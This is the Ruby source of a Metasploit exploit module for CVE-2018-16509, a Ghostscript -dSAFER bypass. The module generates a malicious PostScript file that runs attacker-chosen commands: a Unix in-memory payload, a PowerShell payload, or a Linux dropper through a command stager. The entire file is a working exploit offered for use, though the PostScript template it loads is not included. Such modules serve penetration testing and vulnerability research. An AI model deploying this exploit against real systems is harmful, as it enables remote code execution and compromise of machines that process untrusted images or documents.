# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit

  Rank = ExcellentRanking

  PLACEHOLDER_STRING  = &#039;metasploit&#039;
  PLACEHOLDER_COMMAND = &#039;echo vulnerable > /dev/tty&#039;

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ghostscript Failed Restore Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a -dSAFER bypass in Ghostscript to execute
        arbitrary commands by handling a failed restore (grestore) in
        PostScript to disable LockSafetyParams and avoid invalidaccess.

        This vulnerability is reachable via libraries such as ImageMagick,
        and this module provides the latest vector for Ghostscript.

          exploit/unix/fileformat/ghostscript_type_confusion
          exploit/unix/fileformat/imagemagick_delegate
      },
      &#039;Author&#039;         => [
        &#039;Tavis Ormandy&#039;, # Vuln discovery and exploit
        &#039;wvu&#039;            # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2018-16509&#039;],
        [&#039;URL&#039;, &#039;http://seclists.org/oss-sec/2018/q3/142&#039;],
        [&#039;URL&#039;, &#039;https://bugs.chromium.org/p/project-zero/issues/detail?id=1640&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Aug 21 2018&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;, &#039;win&#039;],
      &#039;Arch&#039;           => [ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        => [
        [&#039;Unix (In-Memory)&#039;,
         &#039;Platform&#039;    => &#039;unix&#039;,
         &#039;Arch&#039;        => ARCH_CMD,
         &#039;Type&#039;        => :unix_memory,
         &#039;Payload&#039;     => {&#039;Space&#039; => 4089, &#039;DisableNops&#039; => true} # 4096 total
        ],
        [&#039;PowerShell (In-Memory)&#039;,
         &#039;Platform&#039;    => &#039;win&#039;,
         &#039;Arch&#039;        => [ARCH_X86, ARCH_X64],
         &#039;Type&#039;        => :psh_memory
        ],
        [&#039;Linux (Dropper)&#039;,
         &#039;Platform&#039;    => &#039;linux&#039;,
         &#039;Arch&#039;        => [ARCH_X86, ARCH_X64],
         &#039;Type&#039;        => :linux_dropper
        ]
      ],
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options([
      OptString.new(&#039;FILENAME&#039;, [true, &#039;Output file&#039;, &#039;msf.ps&#039;])
    ])

    register_advanced_options([
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable dir for droppers&#039;, &#039;/tmp&#039;])
    ])
  end

  def exploit
    sploit = template

    # Replace our placeholder string with a random one
    sploit.sub!(PLACEHOLDER_STRING, Rex::Text.rand_text_alphanumeric(8..42))

    # Replace our test payload with the real one
    case target[&#039;Type&#039;]
    when :unix_memory
      sploit.sub!(PLACEHOLDER_COMMAND, payload.encoded)
    when :psh_memory
      psh = cmd_psh_payload(payload.encoded, payload.arch, remove_comspec: true)

      # XXX: Payload space applies to the payload, not the PSH command
      if psh.length > targets[0].payload_space
        fail_with(Failure::BadConfig, &#039;Please choose a smaller payload&#039;)
      end

      sploit.sub!(PLACEHOLDER_COMMAND, psh)
    when :linux_dropper
      cmdstager = generate_cmdstager(
        linemax: targets[0].payload_space,
        temp:    datastore[&#039;WritableDir&#039;]
      ).join(&#039;;&#039;)

      # XXX: Payload space applies to the payload, not the command stager
      if cmdstager.length > targets[0].payload_space
        fail_with(Failure::BadConfig, &#039;Please choose a smaller command stager&#039;)
      end

      sploit.sub!(PLACEHOLDER_COMMAND, cmdstager)
    end

    file_create(sploit)
  end

  def template
    File.read(File.join(
      Msf::Config.data_directory, &#039;exploits&#039;, &#039;ghostscript&#039;, &#039;msf.ps&#039;
    ))
  end

end

